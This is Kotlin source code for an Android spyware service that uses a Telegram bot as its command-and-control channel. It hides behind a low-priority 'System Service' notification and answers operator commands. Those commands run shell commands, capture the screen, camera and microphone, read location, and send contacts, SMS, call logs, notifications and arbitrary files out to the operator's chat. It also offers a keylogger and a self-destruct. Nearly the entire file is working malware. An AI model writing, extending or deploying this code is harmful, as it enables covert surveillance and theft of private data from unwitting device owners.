package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class TelegramC2Service : Service() {

    companion object {
        private const val TAG = "TgC2"
        private const val NOTIF_ID = 2
        private const val CHANNEL_ID = "c2tg"

        // ── Credentials ───────────────────────────────────
        private val BOT_TOKEN = BuildConfig.TG_BOT_TOKEN
        private val CHAT_ID   = BuildConfig.TG_CHAT_ID
        // ──────────────────────────────────────────────────

        private const val API_BASE = "https://api.telegram.org/bot"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(70, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }
    @Volatile private var projection: MediaProjection? = null
    @Volatile private var lastUpdateId: Long = 0

    private fun log(msg: String) {
        android.util.Log.i(TAG, msg)
        LogBus.append(applicationContext, "TG", msg)
    }

    override fun onCreate() {
        super.onCreate()
        log("onCreate deviceId=$deviceId")
        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)

        if (BOT_TOKEN.startsWith("YOUR_")) {
            log("BOT_TOKEN not configured")
            return
        }

        scope.launch { pollLoop() }
        scope.launch { sendMessage("agent online: ${Build.MODEL} (${Build.MANUFACTURER})") }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        log("onStartCommand action=${intent?.action}")
        if (intent?.action == "START_PROJECTION") {
            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
            val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
                intent.getParcelableExtra("proj_data", Intent::class.java)
            else
                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
            if (code != Int.MIN_VALUE && data != null) {
                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                initProjectionFromIntent(code, data)
            }
        }
        return START_STICKY
    }

    private fun startForegroundCompat(type: Int) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            log("startForeground failed: ${e.message}")
        }
    }

    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            try { projection?.stop() } catch (_: Exception) {}
            projection = null
            val proj = mpm.getMediaProjection(resultCode, data) ?: run {
                log("getMediaProjection returned null")
                return
            }
            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    projection = null
                    log("projection onStop")
                }
            }, Handler(Looper.getMainLooper()))
            projection = proj
            log("projection ACTIVE")
        } catch (e: Exception) {
            log("initProjection ERROR: ${e.message}")
            projection = null
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "TG", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    // ---------- Telegram API ----------

    private suspend fun apiCall(method: String, body: RequestBody): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url("$API_BASE$BOT_TOKEN/$method")
                .post(body)
                .build()
            try {
                client.newCall(req).execute().use { r ->
                    r.body?.string()?.let { JSONObject(it) }
                }
            } catch (e: Exception) {
                log("api $method failed: ${e.message}")
                null
            }
        }

    private suspend fun sendMessage(text: String) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("text", text.take(4000))
            .build()
        apiCall("sendMessage", body)
    }

    private suspend fun sendDocument(filename: String, mime: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody(mime.toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("document", filename, fileBody)
            .build()
        apiCall("sendDocument", body)
    }

    private suspend fun sendPhoto(filename: String, jpegBytes: ByteArray) {
        val fileBody = jpegBytes.toRequestBody("image/jpeg".toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("photo", filename, fileBody)
            .build()
        apiCall("sendPhoto", body)
    }

    private suspend fun sendAudio(filename: String, bytes: ByteArray) {
        val fileBody = bytes.toRequestBody("audio/mp4".toMediaType())
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("audio", filename, fileBody)
            .build()
        apiCall("sendAudio", body)
    }

    // ---------- Long poll ----------

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("offset", (lastUpdateId + 1).toString())
                    .addFormDataPart("timeout", "30")
                    .build()

                val resp = apiCall("getUpdates", body)
                val ok = resp?.optBoolean("ok", false) ?: false
                if (!ok) {
                    delay(5000)
                    continue
                }
                val results = resp?.optJSONArray("result") ?: JSONArray()
                for (i in 0 until results.length()) {
                    val upd = results.getJSONObject(i)
                    val updateId = upd.optLong("update_id")
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(upd)
                }
            } catch (e: Exception) {
                log("poll error: ${e.message}")
            }
            delay(1000)
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        val msg = update.optJSONObject("message") ?: return
        val chatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return
        if (chatId != CHAT_ID) return

        val text = msg.optString("text", "").trim()
        if (text.isEmpty()) return
        log("cmd: $text")

        try {
            dispatchCommand(text)
        } catch (e: Exception) {
            sendMessage("error: ${e.message}")
        }
    }

    private suspend fun dispatchCommand(text: String) {
        val parts = text.split(" ", limit = 2)
        val cmd = parts[0].lowercase().removePrefix("/")
        val arg = parts.getOrNull(1) ?: ""

        when (cmd) {
            "help", "start" -> sendMessage(HELP_TEXT)

            "info" -> {
                val info = DeviceInfo.snapshot(this, deviceId)
                sendMessage(info.toString(2))
            }

            "shell" -> {
                if (arg.isEmpty()) { sendMessage("usage: /shell <cmd>"); return }
                val res = Shell.exec(arg)
                val out = res.optString("stdout", "") + res.optString("stderr", "")
                sendMessage("[exit ${res.optInt("exit", -1)}]\n${out.take(3500)}")
            }

            "screenshot" -> {
                val p = projection ?: run {
                    sendMessage("projection not active - open app and grant screen capture")
                    return
                }
                val res = Screenshot.capture(this, p)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) {
                    sendMessage("capture failed: ${res.optString("error")}")
                    return
                }
                val bytes = Base64.decode(b64, Base64.NO_WRAP)
                sendPhoto("screen_${System.currentTimeMillis()}.jpg", bytes)
            }

            "camera" -> {
                val cam = if (arg.isEmpty()) "back" else arg
                val res = Camera.capture(this, cam)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) {
                    sendMessage("camera error: ${res.optString("error")}")
                    return
                }
                val bytes = Base64.decode(b64, Base64.NO_WRAP)
                sendPhoto("cam_${System.currentTimeMillis()}.jpg", bytes)
            }

            "mic" -> {
                val sec = arg.toIntOrNull()?.coerceIn(1, 60) ?: 10
                sendMessage("recording ${sec}s...")
                val res = Audio.record(this, sec)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) {
                    sendMessage("mic error: ${res.optString("error")}")
                    return
                }
                val bytes = Base64.decode(b64, Base64.NO_WRAP)
                sendAudio("mic_${System.currentTimeMillis()}.m4a", bytes)
            }

            "location" -> {
                val res = Location.get(this)
                sendMessage(res.toString(2))
            }

            "contacts" -> {
                val res = Contacts.list(this)
                sendDocument("contacts.json", "application/json", res.toString().toByteArray())
            }

            "sms" -> {
                val n = arg.toIntOrNull() ?: 20
                val res = Sms.list(this, n)
                sendDocument("sms.json", "application/json", res.toString().toByteArray())
            }

            "calls" -> {
                val n = arg.toIntOrNull() ?: 20
                val res = CallLog.list(this, n)
                sendDocument("calls.json", "application/json", res.toString().toByteArray())
            }

            "apps" -> {
                val res = Apps.list(this, false)
                sendDocument("apps.json", "application/json", res.toString().toByteArray())
            }

            "network" -> {
                val res = NetworkInfo.snapshot(this)
                sendMessage(res.toString(2).take(3500))
            }

            "lock" -> {
                val res = SystemControl.lockScreen(this)
                sendMessage(res.toString())
            }

            "home" -> sendMessage(SystemControl.goHome().toString())
            "back" -> sendMessage(SystemControl.back().toString())
            "recents" -> sendMessage(SystemControl.recents().toString())

            "notif" -> {
                val res = JSONObject()
                    .put("count", NotificationsBuffer.peek().length())
                    .put("items", NotificationsBuffer.drain())
                sendDocument("notifications.json", "application/json", res.toString().toByteArray())
            }

            "ls" -> {
                val res = Files.listDir(if (arg.isEmpty()) "/sdcard" else arg)
                sendMessage(res.toString(2).take(3500))
            }

            "get" -> {
                if (arg.isEmpty()) { sendMessage("usage: /get <path>"); return }
                val res = Files.exfil(this, arg)
                val b64 = res.optString("data_b64", "")
                if (b64.isEmpty()) {
                    sendMessage("error: ${res.optString("error")}")
                    return
                }
                val bytes = Base64.decode(b64, Base64.NO_WRAP)
                val name = arg.substringAfterLast('/').ifEmpty { "file.bin" }
                sendDocument(name, "application/octet-stream", bytes)
            }

            "open" -> {
                val res = SystemControl.openApp(this, arg)
                sendMessage(res.toString())
            }

            "url" -> {
                val res = SystemControl.openUrl(this, arg)
                sendMessage(res.toString())
            }

            "keylog_start" -> {
                KeylogBuffer.start()
                sendMessage("keylogger started")
            }
            "keylog_stop" -> {
                KeylogBuffer.stop()
                sendMessage("keylogger stopped")
            }
            "keylog_dump" -> {
                val res = KeylogBuffer.dump()
                sendMessage(res.optString("output", "").take(3500).ifEmpty { "(empty)" })
            }

            "vibrate" -> {
                Ui.vibrate(this, arg.toLongOrNull() ?: 500)
                sendMessage("ok")
            }
            "toast" -> {
                Ui.toast(this, arg.ifEmpty { "hello" })
                sendMessage("ok")
            }

            "selfdestruct" -> {
                sendMessage("self-destruct initiated")
                delay(1000)
                SelfDestruct.run(this)
            }

            else -> sendMessage("unknown: /$cmd - try /help")
        }
    }

    override fun onDestroy() {
        log("onDestroy")
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        scope.cancel()
        super.onDestroy()
    }
}

private val HELP_TEXT = """
C2 Bot Commands

/info - device info
/shell <cmd> - run shell
/screenshot - screen capture
/camera [front|back] - photo
/mic [sec] - record audio
/location - GPS
/contacts - contacts dump
/sms [n] - last n SMS
/calls [n] - last n calls
/apps - installed apps
/network - network info
/ls [path] - list dir
/get <path> - download file
/notif - drain notifications
/open <pkg> - launch app
/url <url> - open URL
/lock /home /back /recents - navigation
/vibrate [ms]
/toast <text>
/keylog_start /keylog_stop /keylog_dump
/selfdestruct
""".trimIndent()
